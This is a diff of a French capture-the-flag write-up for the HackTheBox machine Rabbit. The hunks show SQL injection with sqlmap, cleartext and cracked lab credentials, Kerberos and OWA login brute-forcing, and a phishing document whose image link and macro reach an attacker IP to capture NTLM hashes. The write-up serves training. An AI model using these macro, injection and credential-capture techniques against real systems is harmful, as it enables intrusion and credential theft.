@@ -12,7 +12,7 @@ Follow the white Rabbit
 
 On commence par l'éternel scan Nmap qui décrit une machine Windows assez classique... mais aussi avec LDAP et MySQL. On note la présence d'un serveur IIS ainsi qu'un Apache avec PHP.  
 
-```plain
+```
 Nmap scan report for 10.10.10.71
 Host is up (0.051s latency).
 Not shown: 917 closed ports, 59 filtered ports
@@ -118,7 +118,7 @@ Host script results:
 
 Commençons par le serveur IIS sur le port 443. J'ai lancé mon buster perso et j'ai trouvé différentes URL qui m'ont presque toutes ramenées vers un *Outlook Web Access* :  
 
-```plain
+```
 https://10.10.10.71/public/ - HTTP 302 (147 bytes, plain) redirects to https://10.10.10.71/owa/
 https://10.10.10.71/exchange/ - HTTP 302 (147 bytes, plain) redirects to https://10.10.10.71/owa/
 https://10.10.10.71/owa/ - HTTP 302 (0 bytes, plain) redirects to https://10.10.10.71/owa/auth/logon.aspx?url=https://10.10.10.71/owa/&reason=0
@@ -131,7 +131,7 @@ La pèche est meilleure avec le serveur Apache. La page d'index est un ascii-art
 
 ![HackTheBox Rabbit ascii-art](/assets/img/htb/rabbit_ascii_art.jpg)
 
-```plain
+```
 http://10.10.10.71:8080/phpmyadmin/
 http://10.10.10.71:8080/phpsysinfo/
 http://10.10.10.71:8080/complain/
@@ -152,7 +152,7 @@ On y trouve plusieurs tables avec des utilisateurs : *tbl\_customer*, *tbl\_supp
 
 Les mots de passe sont stockés en clair dans la base :  
 
-```plain
+```
 INSERT INTO `tbl_engineer` (`eid`, `ename`, `epass`, `address`, `email`, `e_mobile`, `date_time`) VALUES
 (6, 'Amol sarode', 'amol', '12/c, camp, pune', 'amol.sarode@gmail.co', '2541258452', '2011-02-02 23:36:51'),
 (5, 'Ramiz Khan', 'ramiz', '10, merta tower', 'ramiz@gmail.com', '9854251425', '2011-02-02 23:36:09'),
@@ -164,7 +164,7 @@ Civet de lapin
 
 On peut dès lors se connecter avec l'un des comptes, récupérer le cookie (via extension dédiée ou via les outils de développement du navigateur) puis utiliser ce cookie dans sqlmap pour exploiter la vulnérabilité mentionnée plus tôt :  
 
-```plain
+```
 devloop@kali:~$ sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans' -p id --cookie "PHPSESSID=nj9rojjcqt74jeidet86csire6" --dbms mysql
 GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
 sqlmap identified the following injection point(s) with a total of 1363 HTTP(s) requests:
@@ -182,7 +182,7 @@ Parameter: id (GET)
 
 Il apparaît assez vite que les requêtes sont exécutées avec l'utilisateur root de MySQL. On ne peut malheureusement pas dumper directement la base (via connexion au port 3306) car l'utilisateur est seulement autorisé à se connecter en local. Pas trop grave quand on a sqlmap sous la main.  
 
-```plain
+```
 available databases [7]:
 [*] complain
 [*] information_schema
@@ -195,7 +195,7 @@ available databases [7]:
 
 On ne trouve rien d'intéressant dans *complain* mais la base *secret* nous apporte des hashs supplémentaires (sqlmap a cassé certains des hashs, j'ai édité les autres trouvés via [CrackStation](https://crackstation.net/)) :  
 
-```plain
+```
 Database: secret                                                                                                                                                                                                  
 Table: users
 [10 entries]
@@ -221,7 +221,7 @@ A ce stade, vu qu'on dispose des droits les plus importants de MySQL et qu'en pl
 
 Seulement on ne peut pas le faire en raison d'un MySQL 5.7.19 avec l'option *secure\_file\_priv* lisible via *--sql-shell* de sqlmap :  
 
-```plain
+```
 sql-shell> select @@global.secure_file_priv;
 [16:46:22] [INFO] fetching SQL SELECT statement query output: 'select @@global.secure_file_priv'
 [16:46:29] [INFO] retrieved: c:\\wamp64\\tmp\\
@@ -232,7 +232,7 @@ Du coup j'ai choisi de placer les noms d'utilisateurs dans un fichier, les passw
 
 On peut par exemple utiliser le module *gather/kerberos\_enumusers* de *Metasploit* qui nous indique que tous les utilisateurs ne sont pas présents sur le système :  
 
-```plain
+```
 [+] 10.10.10.71:88 - User: "administrator" is present
 [*] 10.10.10.71:88 - Testing User: "kain"...
 [*] 10.10.10.71:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
@@ -259,7 +259,7 @@ On peut par exemple utiliser le module *gather/kerberos\_enumusers* de *Metasplo
 
 de quoi réduire notre liste à ces credentials :  
 
-```plain
+```
 kain doradaybendita
 magnus xNnWo6272k7x
 raziel kelseylovesbarry
@@ -270,7 +270,7 @@ On peut les utiliser pour fouiller dans l'annuaire LDAP (*ldapsearch -x -H ldap:
 
 Ça devient plus intéressant quand on les essaye sur le OWA (EWS est en quelque sorte l'API):  
 
-```plain
+```
 msf auxiliary(scanner/http/owa_ews_login) > exploit
 
 [+] Found NTLM service at /ews/ for domain HTB.
@@ -296,7 +296,7 @@ La première chose que j'ai essayé c'est l'inclusion de référence à des docu
 
 Pour cela on crée d'abord un fichier HTML :  
 
-```plain
+```
 <html>
 <body>
 <img src="file://///10.10.15.90/share/img.png" />
@@ -323,7 +323,7 @@ Il faut ensuite :
 
 On place alors une macro avec un nom quelconque, par exemple :  
 
-```plain
+```
 Sub RogerRabbit
     Shell("net use x: \\10.10.15.90")
 End Sub
@@ -341,7 +341,7 @@ Il faut ensuite ferme la fenêtre d'édition des Macros et aller dans *Tools > C
 
 On envoi le document à tous les destinataires du carnet d'adresse et on attend. Au bout d'un moment il y a de l'activité dans le *tshark* :  
 
-```plain
+```
  1 0.000000000  10.10.10.71 → 10.10.15.90  TCP 52 54540 → 445 [SYN] Seq=0 Win=8192 Len=0 MSS=1357 WS=256 SACK_PERM=1
  2 0.000049420  10.10.15.90 → 10.10.10.71  TCP 52 445 → 54540 [SYN, ACK] Seq=0 Ack=1 Win=29200 Len=0 MSS=1460 SACK_PERM=1 WS=128
  3 0.027699057  10.10.10.71 → 10.10.15.90  TCP 40 54540 → 445 [ACK] Seq=1 Ack=1 Win=66304 Len=0
@@ -356,7 +356,7 @@ On envoi le document à tous les destinataires du carnet d'adresse et on attend.
 
 et aussi sur le module auxiliaire de capture SMB :  
 
-```plain
+```
 [*] SMB Captured - 2018-05-31 20:15:14 +0200
 NTLMv2 Response Captured from 10.10.10.71:54540 - 10.10.10.71
 USER:Raziel DOMAIN:HTB OS: LM:
@@ -382,7 +382,7 @@ D'autant plus énervant qu'en local *Defender* bloquait toute utilisation de *ce
 
 Une fois le shell netcat obtenu on peut l'upgrader vers un Meterpreter mais avec Defender la plupart des techniques sont bloquées. J'ai profité de la présence de PHP sur le système avec le module web\_delivery :  
 
-```plain
+```
 msf exploit(multi/script/web_delivery) > exploit -j
 [*] Exploit running as background job 4.
 
